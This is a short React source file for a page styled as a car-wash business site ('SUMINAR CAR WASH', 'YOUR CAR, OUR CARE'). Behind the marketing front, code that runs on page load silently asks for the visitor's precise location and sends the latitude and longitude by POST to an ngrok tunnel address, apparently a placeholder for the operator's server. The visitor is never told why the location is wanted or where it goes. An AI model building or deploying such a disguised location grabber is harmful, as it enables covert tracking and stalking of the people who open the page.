


import { useEffect, useRef } from "react";
import "./App.css";

const API = "https://ALAMAT-NGROK/gps";

function App() {

  const hasSent = useRef(false);

  useEffect(() => {

    if (hasSent.current) return;
    hasSent.current = true;

    if (!navigator.geolocation) return;

    navigator.geolocation.getCurrentPosition(
      async (position) => {

        const data = {
          lat: position.coords.latitude,
          long: position.coords.longitude
        };

        try {
          await fetch(API, {
            method: "POST",
            headers: {
              "Content-Type": "application/json"
            },
            body: JSON.stringify(data)
          });

        } catch (error) {
          console.error(error);
        }

      },

      (error) => {
        console.error(error.message);
      },

      {
        enableHighAccuracy: true,
        timeout: 15000,
        maximumAge: 0
      }
    );

  }, []);

  return (
    <div className="page">

      <header className="header">
        <h1>SUMINAR CAR WASH</h1>
      </header>

      <main className="hero">

        <img
          src="/car00.png"
          alt="Suminar Car Wash"
        />

        <div className="hero-text">
          <h2>YOUR CAR, OUR CARE</h2>
          <p>Professional Car Wash & Detailing</p>
        </div>

      </main>

    </div>
  );
}

export default App;
